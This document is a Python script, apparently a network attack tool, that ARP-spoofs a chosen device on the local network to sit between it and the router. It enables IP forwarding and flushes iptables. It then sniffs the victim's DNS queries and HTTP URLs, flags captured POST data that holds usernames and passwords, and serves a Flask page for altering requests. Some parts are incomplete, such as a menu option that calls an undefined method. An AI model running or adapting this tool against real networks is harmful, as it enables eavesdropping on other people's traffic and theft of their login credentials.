#!/usr/bin/env python3

import argparse
import threading
from colorama import Fore, Style
from time import strftime, localtime
from scapy.all import arp_mitm, sniff, DNS, srp, Ether, ARP, send, IP, UDP, DNSRR
from mac_vendor_lookup import MacLookup, VendorNotFoundError
import os
import platform
import ctypes
import subprocess
from flask import Flask, render_template_string, request, redirect

# Check platform and privileges
if platform.system() == "Windows":
    if not ctypes.windll.shell32.IsUserAnAdmin():
        print(f"{Fore.RED}This script requires Administrator privileges. Please run as Administrator.{Style.RESET_ALL}")
        exit(1)
elif platform.system() == "Linux":
    if os.geteuid() != 0:
        print(f"{Fore.RED}This script requires root privileges. Please run with sudo.{Style.RESET_ALL}")
        exit(1)
else:
    print(f"{Fore.RED}Unsupported OS: {platform.system()}{Style.RESET_ALL}")
    exit(1)

parser = argparse.ArgumentParser(description='Device network sniffer')
parser.add_argument('--network', help='Network to scan (e.g., "192.168.0.0/24")', required=True)
parser.add_argument('--iface', help='Network interface to use', required=True)
parser.add_argument('--routerip', help='IP of your home router', required=True)
opts = parser.parse_args()

def arp_scan(network, iface):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network),
                 timeout=5, iface=iface, verbose=False)
    print(f'\n{Fore.RED}######## NETWORK DEVICES ########{Style.RESET_ALL}\n')
    for i in ans:
        mac = i.answer[ARP].hwsrc
        ip = i.answer[ARP].psrc
        try:
            vendor = MacLookup().lookup(mac)
        except VendorNotFoundError:
            vendor = 'unrecognized device'
        print(f'{Fore.BLUE}{ip}{Style.RESET_ALL} ({mac}, {vendor})')
    print(f'{Fore.YELLOW}0. Exit{Style.RESET_ALL}')
    return input('\nPick a device IP: ')

class Device:
    def __init__(self, routerip, targetip, iface):
        self.routerip = routerip
        self.targetip = targetip
        self.iface = iface

    def mitm(self):
        while True:
            try:
                arp_mitm(self.routerip, self.targetip, iface=self.iface)
            except OSError:
                print('IP seems down, retrying ..')
                continue

    def capture_dns(self):
        sniff(iface=self.iface, prn=self.dns,
              filter=f'src host {self.targetip} and udp port 53', store=0)

    def dns(self, pkt):
        record = pkt[DNS].qd.qname.decode('utf-8').strip('.')
        time = strftime("%m/%d/%Y %H:%M:%S", localtime())
        print(f'[{Fore.GREEN}{time} | {Fore.BLUE}{self.targetip} -> {Fore.RED}{record}{Style.RESET_ALL}]')

    def http_request_modification(self):
        app = Flask(__name__)
        http_traffic = []  # This will store visited URLs for modification

        @app.route("/", methods=["GET", "POST"])
        def modify_request():
            if request.method == "POST":
                modified_content = request.form.get("content")
                selected_url = request.form.get("url")
                # Here you can modify the content based on the user input
                print(f"Modified content for {selected_url}: {modified_content}")
                return redirect(f"http://{selected_url}")

            # If HTTP traffic exists, display it for modification
            if http_traffic:
                return render_template_string("""
                    <form method="post">
                        <label for="url">Select URL to modify:</label>
                        <select name="url">
                            {% for url in http_traffic %}
                                <option value="{{url}}">{{url}}</option>
                            {% endfor %}
                        </select><br>
                        Content: <textarea name="content"></textarea><br>
                        <input type="submit" value="Modify">
                    </form>
                """, http_traffic=http_traffic)

            return """
                <h2>No HTTP traffic detected yet.</h2>
                <p>Wait for HTTP traffic to appear before modifying URLs.</p>
            """

        def http_pkt_callback(pkt):
            if pkt.haslayer('Raw'):
                raw_data = pkt['Raw'].load.decode(errors='ignore')
                if "POST" in raw_data or "GET" in raw_data:
                    if "Host:" in raw_data and "GET" in raw_data:
                        try:
                            host = raw_data.split("Host: ")[1].split("\r\n")[0]
                            path = raw_data.split("GET ")[1].split(" HTTP")[0]
                            url = f"http://{host}{path}"
                            if url not in http_traffic:
                                http_traffic.append(url)  # Add the URL to the list
                            print(f"{Fore.CYAN}Visited URL: {url}{Style.RESET_ALL}")
                        except Exception:
                            pass

                    if "POST" in raw_data:
                        if any(k in raw_data.lower() for k in ['username', 'user', 'login', 'email']) and \
                           any(k in raw_data.lower() for k in ['password', 'pass', 'pwd']):
                            print(f"{Fore.RED}[!] Possible Credentials Found:{Style.RESET_ALL}")
                            for line in raw_data.split('\r\n'):
                                if '=' in line and len(line) < 100:
                                    print(f"{Fore.YELLOW}    {line}{Style.RESET_ALL}")

        # Start sniffing in a separate thread
        threading.Thread(target=lambda: sniff(iface=self.iface, prn=http_pkt_callback,
                                              filter=f'tcp port 80 and host {self.targetip}', store=0)).start()

        app.run(debug=False, host="0.0.0.0", port=5000)

    def enable_ip_forwarding(self):
        # Enable IP forwarding using subprocess
        subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
        print(f'{Fore.GREEN}IP forwarding enabled!{Style.RESET_ALL}')

    def set_iptables(self):
        # Use iptables to forward packets to NFQUEUE
        subprocess.call(f"iptables --flush", shell=True)
        subprocess.call(f"iptables -A FORWARD -j NFQUEUE --queue-num 0", shell=True)
        print(f'{Fore.GREEN}Iptables rules set to forward packets to NFQUEUE 0.{Style.RESET_ALL}')

    def sniff(self):
        while True:
            print(f'\n{Fore.GREEN}Select Your Choice:{Style.RESET_ALL}')
            print(f'1. DNS Sniff\n2. HTTP Sniff\n3. HTTP Request Modification\n4. Exit')
            try:
                choice = int(input(f'{Fore.BLUE}Your choice: {Style.RESET_ALL}'))
            except ValueError:
                print(f"{Fore.RED}Invalid input! Please enter a number.{Style.RESET_ALL}")
                continue
            if choice == 1:
                self.capture_dns()
            elif choice == 2:
                self.http_sniff()
            elif choice == 3:
                self.http_request_modification()
            elif choice == 4:
                print(f'{Fore.YELLOW}Exiting...{Style.RESET_ALL}')
                break
            else:
                print(f'{Fore.RED}Invalid choice, try again.{Style.RESET_ALL}')

if __name__ == '__main__':
    while True:
        targetip = arp_scan(opts.network, opts.iface)
        if targetip == "0":
            print(f'{Fore.YELLOW}Exiting...{Style.RESET_ALL}')
            break
        device = Device(opts.routerip, targetip, opts.iface)
        device.enable_ip_forwarding()
        device.set_iptables()
        try:
            device.sniff()
        except KeyboardInterrupt:
            print(f'\n{Fore.CYAN}Returning to menu...{Style.RESET_ALL}')
            continue
